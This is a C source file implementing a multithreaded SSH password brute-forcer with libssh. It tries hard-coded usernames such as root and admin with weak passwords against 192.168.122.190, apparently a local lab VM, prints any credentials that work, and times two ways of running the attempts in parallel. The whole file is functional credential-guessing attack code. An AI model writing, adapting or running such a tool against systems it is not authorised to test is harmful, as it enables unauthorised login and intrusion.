#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/sched.h>
#include <sched.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <linux/futex.h>
#include <pthread.h>
#include <libssh/libssh.h>

static int futex_result = 1;
static int futex_complete_password = 1;
static int futex_complete_user = 1;

struct ssh_brute_options {
	char *password;
	char *host;
	char *username;
	int port;
	size_t *completed;
	char *result;
};

struct ssh_username_options {
	char *host;
	char *username;
	int port;
	char **passwords;
	size_t pcount;
	size_t *completed;
};


static int futex(int *uaddr, int futex_op, int val, const struct timespec *timeout,
	  int *uaddr2, int val3)
{
	return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

static void pi_futex_wait(int *futexp)
{
	int s;

	while (1) {
		if (__sync_bool_compare_and_swap(futexp, 1, 0))
			break;

		s = futex(futexp, FUTEX_WAIT, 0, NULL, NULL, 0);
		if (s == -1 && errno != EAGAIN) {
			perror("futex wait");
			exit(1);
		}
	}
}

static void pi_futex_wake(int *futexp)
{
	int s;

	if (__sync_bool_compare_and_swap(futexp, 0, 1)) {
		s = futex(futexp, FUTEX_WAKE, 1, NULL, NULL, 0);
		if (s == -1) {
			perror("futex wake");
			exit(1);
		}
	}
}

static void *connect_worker(void *arg)
{
	ssh_session session;
	struct ssh_brute_options *btop = arg;
	pid_t tid = gettid();
	int rc = 0;

	if (btop == NULL) {
		printf("Wrong argument for thread [%u]\n", tid);
		goto exit;
	}
	//printf("%s, %s, %s, %d\n", btop->password, btop->host, btop->username, btop->port);

	session = ssh_new();
	if (!session) {
		printf("Cannot connect to [%s]", btop->host);
		goto exit;
	}

	ssh_options_set(session, SSH_OPTIONS_HOST, btop->host);
	ssh_options_set(session, SSH_OPTIONS_PORT, &btop->port);
	ssh_options_set(session, SSH_OPTIONS_USER, btop->username);

	rc = ssh_connect(session);
	if (rc != SSH_OK) {
		printf("Cannot connect to host [%s]\n", btop->host);
		goto free_ssh;
	}

	rc = ssh_userauth_password(session, NULL, btop->password);
	if (rc == SSH_AUTH_SUCCESS) {
		pi_futex_wait(&futex_result);
		strncpy(btop->result, btop->password, strlen(btop->password));
		pi_futex_wake(&futex_result);
	}

	ssh_disconnect(session);
free_ssh:
	ssh_free(session);
exit:
	pi_futex_wait(&futex_complete_password);
	(*btop->completed)++;
	pi_futex_wake(&futex_complete_password);

	pthread_exit(NULL);
}

static void *user_connection_thread(void *arg)
{
	struct ssh_username_options *uo = arg;
	struct ssh_brute_options *btop; 
	pthread_t *threads;
	int err = -1, tidx = 0, i;
	size_t completed_password = 0;
	char result[4096] = { 0 };

	if (!uo) {
		printf("[%s] wrong uo\n", __func__);
		goto exit;
	}

	threads = malloc(sizeof(pthread_t)*uo->pcount);
	if (!threads) {
		perror("Cannot allocate memory for threads\n");
		goto exit;
	}

	btop = malloc(sizeof(struct ssh_brute_options)*uo->pcount);
	if (!btop) {
		perror("Cannot alloc memory for ssh brute ops");
		goto free_threads;
	}

	for (tidx = 0; tidx < uo->pcount; tidx++) {

		btop[tidx].password = uo->passwords[tidx];
		btop[tidx].host = uo->host;
		btop[tidx].port = uo->port;
		btop[tidx].username = uo->username;
		btop[tidx].completed = &completed_password;
		btop[tidx].result = (char*)&result;

		err = pthread_create(&threads[tidx], 0, connect_worker, (void*)&btop[tidx]);
		if (err < 0) {
			printf("Error to create pthread [%d]\n", tidx);
			goto join_threads;
		}
	}

	err = 0;
	while (completed_password != uo->pcount) {
		//printf("sleep [%d] [%d]\n", completed, pcount);
		usleep(1000);
	}
join_threads:
	while (tidx) {
		pthread_join(threads[--tidx], NULL);
	}

	if (strlen(result) > 0) {
		printf("username -----> %s , password -----> %s\n", uo->username, result);
		memset(result, 0, 4096);
	} else {
		printf("Cannot find password for %s\n", uo->username);
	}

	free(btop);
free_threads:
	free(threads);
exit:
	(*uo->completed)++;
	return NULL;
}

static void users_and_passwords_parallel(void)
{
	char *passwords[] = {
		"lalalala",
		"lololo",
		"1",
		"qwerty123",
		"dog777"
	};
	size_t passwords_count = 5;

	char *users[] = {
		"root",
		"nester",
		"user",
		"admin"
	};
	size_t users_count = 4;

	int err = 0, tidx = 0;
	clock_t start, end;
	double cpu_time_used;
	struct ssh_username_options uo[users_count]; 
	size_t completed_users = 0;

	pthread_t *threads;

	threads = malloc(sizeof(pthread_t)*users_count);
	if (!threads) {
		perror("Cannot allocate memory for user threads\n");
		return ;
	}

	start = clock();
	for (tidx = 0; tidx < users_count; tidx++) {
		uo[tidx].host = "192.168.122.190",
		uo[tidx].username = NULL,
		uo[tidx].port = 22,
		uo[tidx].passwords = passwords,
		uo[tidx].pcount = passwords_count,
		uo[tidx].username = users[tidx];
		uo[tidx].completed = &completed_users;

		err = pthread_create(&threads[tidx], 0, user_connection_thread, (void*)&uo[tidx]);
		if (err < 0) {
			printf("Error to create pthread [%d]\n", tidx);
			goto join_threads;
		}
	}

	while (completed_users != users_count) {
		//printf("sleep [%d] [%d]\n", completed, pcount);
		usleep(1000);
	}

join_threads:
	while (tidx) {
		pthread_join(threads[--tidx], NULL);
	}
	end = clock();
	cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;
	printf("user and passwords parallel %f\n", cpu_time_used);

	free(threads);
}

static void only_passwords_parallel(void)
{
	char *passwords[] = {
		"lalalala",
		"lololo",
		"1",
		"qwerty123",
		"dog777"
	};
	size_t passwords_count = 5;

	char *users[] = {
		"root",
		"nester",
		"user",
		"admin"
	};
	size_t users_count = 4;

	int i;
	clock_t start, end;
	double cpu_time_used;
	size_t completed = 0;
	struct ssh_username_options uo = {
		.host = "192.168.122.190",
		.username = NULL,
		.port = 22,
		.passwords = passwords,
		.pcount = passwords_count,
		.completed = &completed,
	};

	start = clock();
	for (i = 0; i < users_count; i++) {
		uo.username = users[i];
		user_connection_thread(&uo);
	}
	end = clock();
	cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;
	printf("Only passwords parallel %f\n", cpu_time_used);

}

int main(int argc, const char *argv[])
{

	only_passwords_parallel();
	users_and_passwords_parallel();
	return 0;
}
